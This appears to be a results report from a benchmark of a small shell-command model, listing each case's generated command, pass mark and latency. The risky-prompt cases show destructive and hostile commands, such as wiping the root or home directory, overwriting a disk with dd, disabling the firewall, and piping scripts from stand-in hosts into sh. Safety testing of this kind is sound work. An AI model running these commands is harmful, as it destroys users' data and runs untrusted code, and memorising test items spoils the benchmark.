# eval: llama-server / kitty-bash-0.5b (core-v2)
- mode: plain · dataset core.jsonl#83828218eadbc7f7 · repeat 1
- pass: 55/72 (76%)
- cold p50 106ms p95 230ms · warm p50 0ms p95 0ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✓ | 82 | - | node -v && npm -v |
| u02 | ✗ | 98 | - | find . -type f -exec ls -s {} \; |
| u03 | ✓ | 53 | - | curl ifconfig.me |
| u04 | ✓ | 108 | - | ss -tlnp | grep :3000 |
| u05 | ✓ | 59 | - | du -sh . |
| u06 | ✓ | 168 | - | find . -type f -name "*.log" -mtime -1 |
| u07 | ✗ | 67 | - | ps aux |
| u08 | ✓ | 75 | - | git status --branch |
| u09 | ✓ | 73 | - | brew install ripgrep |
| u10 | ✓ | 73 | - | mkdir projects && cd projects |
| u11 | ✓ | 95 | - | tar -czvf archive.tar.gz folder |
| u12 | ✓ | 67 | - | env | grep PATH |
| u13 | ✓ | 214 | - | lsof -i:8080 | awk '{print $2}' | xargs kill -9 |
| u14 | ✓ | 171 | - | tail -n 20 /var/log/syslog |
| u15 | ✓ | 89 | - | python3 --version |
| u16 | ✓ | 81 | - | brew update && brew outdated |
| u17 | ✓ | 106 | - | echo $SHELL |
| u18 | ✓ | 125 | - | git reset --soft HEAD~1 |
| u19 | ✗ | 265 | - | find ~ -type f -exec du -h {} + | sort -hr | head -n 5 |
| u20 | ✓ | 79 | - | free -m |
| u21 | ✗ | 147 | - | find . -name "*.js" | xargs wc -l |
| u22 | ✓ | 68 | - | sudo systemctl restart docker |
| u23 | ✓ | 105 | - | chmod +x script.sh && ./script.sh |
| u24 | ✓ | 94 | - | grep -R "TODO" . |
| u25 | ✓ | 195 | - | curl -L -o ~/Downloads/file.zip https://example.com/file.zip |
| u26 | ✗ | 100 | - | sysctl hw.ncpu |
| u27 | ✓ | 135 | - | echo 'export FOO=bar' >> ~/.zshrc |
| u28 | ✓ | 154 | - | find . -type d -name 'node_modules' -exec rm -rf {} \; |
| u29 | ✓ | 108 | - | ss -tlnp |
| u30 | ✓ | 120 | - | unzip -d . file.zip |
| u31 | ✓ | 141 | - | tail -f /var/log/syslog |
| u32 | ✓ | 51 | - | uptime |
| u33 | ✗ | 103 | - | find . -type f -name ".zshrc" |
| u34 | ✓ | 68 | - | cat /etc/resolv.conf |
| u35 | ✓ | 60 | - | cp file.txt backup.txt |
| u36 | ✗ | 105 | - | sed -i 's/old/new/g' old.txt |
| u37 | ✗ | 57 | - | du -h downloads |
| u38 | ✓ | 70 | - | npm list -g |
| u39 | ✓ | 202 | - | find . -type d | xargs -I {} sh -c 'cd "{}" && open -a Finder' |
| u40 | ✗ | 97 | - | sudo dnf -y clean all |
| a01 | ✓ | 116 | - | find ~ -exec rm -rf {} \; |
| a02 | ✓ | 212 | - | sudo dd if=/dev/urandom of=/dev/sdb bs=4M count=1024 |
| a03 | ✓ | 134 | - | git push --force-with-lease origin main |
| a04 | ✗ | 182 | - | curl -fsSL https://sketchy.example.com/install.sh | sh |
| a05 | ✗ | 172 | - | ps -ef | awk '{print $2}' | xargs kill -9 |
| a06 | ✗ | 106 | - | sudo chmod 777 everything in root |
| a07 | ✗ | 103 | - | alias -s zsh='zsh -i' |
| a08 | ✓ | 91 | - | curl -s https://x.io/i | sh |
| a09 | ✓ | 81 | - | sudo chmod -R 755 / |
| a10 | ✓ | 230 | - | find /var/log -type f -mtime +30 -exec rm {} \; |
| a11 | ✗ | 147 | - | echo "/path/to/script.sh" | sudo tee --append /etc/rc.local |
| a12 | ✓ | 93 | - | git reset --hard HEAD |
| a13 | ✓ | 62 | - | brew uninstall node |
| a14 | ✓ | 66 | - | sudo ufw disable |
| a15 | ✓ | 152 | - | find . -type f -name "*.tmp" -exec rm {} \; |
| a16 | ✗ | 363 | - | du -sh */ | sort -hr | awk '{print $2" "$1}' |
| a17 | ✓ | 121 | - | set -e; rm -rf ~/ |
| a18 | ✗ | 124 | - | echo -n "hunter2" | md5sum |
| a19 | ✓ | 131 | - | echo 'export PATH=$PATH:/usr/local/bin' >> ~/.zshrc |
| a20 | ✓ | 74 | - | sudo rm -rf / --no-preserve-root |
| u41 | ✓ | 92 | - | find ~ -size +100M |
| u42 | ✓ | 173 | - | echo 'hello world' > my notes.txt |
| u43 | ✓ | 149 | - | git log -5 --pretty=format:"%h %s" |
| u44 | ✓ | 123 | - | curl -s https://example.com | cat |
| u45 | ✓ | 160 | - | find . -type f | wc -l |
| u46 | ✓ | 222 | - | ifconfig | grep 'inet addr:' | grep -v '127.0.0.1' | awk '{print $2}' |
| u47 | ✓ | 49 | - | df -h |
| u48 | ✓ | 39 | - | who |
| a21 | ✓ | 321 | - | (crontab -l 2>/dev/null; echo "0 0 * * * /bin/rm -rf /tmp") | crontab - |
| a22 | ✓ | 144 | - | ln -s $(pwd)/myhomefile /etc/hosts |
| a23 | ✓ | 129 | - | find . -exec rm {} \; |
| a24 | ✗ | 119 | - | curl https://x.io/i.sh | bash |
